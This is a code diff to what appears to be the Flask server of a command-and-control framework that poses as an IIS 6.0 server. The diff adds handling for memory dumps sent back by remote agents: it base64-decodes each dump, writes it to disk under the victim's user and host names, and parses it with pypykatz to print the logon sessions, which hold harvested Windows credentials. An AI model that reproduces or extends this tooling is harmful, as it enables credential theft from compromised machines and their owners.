@@ -13,7 +13,8 @@ from core.config import *
 import base64 as base64mod
 import sys
 import threading
-
+from pypykatz.pypykatz import pypykatz
+import json
 from flask import *
 
 SERVER_NAME = 'Microsoft-IIS/6.0'
@@ -407,11 +408,19 @@ def result():
             server.start()
             return "OK"
         if data.decode("UTF-8").find("Dump_start_from_here:")>-1:
-            print (data.decode("UTF-8").decode("UTF-8").find("Kerberoast-Module"))
+            #print (data.decode("UTF-8").decode("UTF-8").find("Dump_start_from_here:"))
             fname="downloads/"+AGENTS[id][7]+"@"+AGENTS[id][6]+"safetydump.dmp"
             k=open(fname,"w")
             k.write(data.decode("UTF-8").replace("\00"," ").split("Dump_start_from_here:")[1])
             k.close()
+
+            fname="downloads/"+AGENTS[id][6]+"safetydump-decoded.dmp"
+            k=open(fname,"wb")
+            k.write(base64mod.b64decode(data.decode("UTF-8").replace("\00"," ").split("Dump_start_from_here:")[1]))
+            k.close()
+            mimi = pypykatz.parse_minidump_file("downloads/"+AGENTS[id][6]+"safetydump-decoded.dmp")
+            for luid in mimi.logon_sessions:
+                print(str(mimi.logon_sessions[luid]))
             return 'OK'
         print (bcolors.OKGREEN + p_out + bcolors.ENDC)
         print (data.decode("UTF-8"))
